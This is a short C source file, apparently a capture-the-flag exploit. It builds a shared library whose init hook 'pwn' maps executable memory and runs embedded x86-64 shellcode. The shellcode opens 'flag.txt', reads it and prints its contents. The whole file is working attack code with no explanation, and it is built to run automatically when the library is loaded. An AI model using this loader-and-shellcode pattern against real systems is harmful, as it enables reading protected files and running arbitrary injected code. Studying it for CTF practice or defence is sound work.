#include <stdio.h>
#include <sys/mman.h>
#include <string.h>

// musl-gcc -static -fPIC -shared -Wl,-init,pwn r2s.c -o r2s.so

unsigned char sc[] = "\x48\xC7\xC0\x02\x00\x00\x00\x48\x31\xD2\x48\x31\xF6\x49\xBC\x66\x6C\x61\x67\x2E\x74\x78\x74\x48\xC7\x04\x24\x00\x00\x00\x00\x41\x54\x48\x89\xE7\x0F\x05\x48\x89\xC7\x48\x31\xC0\x48\x89\xE6\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05\x48\xC7\xC0\x01\x00\x00\x00\x48\x89\xE6\x48\xC7\xC7\x01\x00\x00\x00\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05";

void pwn() {
	unsigned char *f = mmap(0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0);

	puts("hello world!");

	if (f == 0) {
		puts(":(");
	}

	memcpy(f, sc, sizeof(sc));

	void (*p)(void) = f; 
	(*p)(); 
}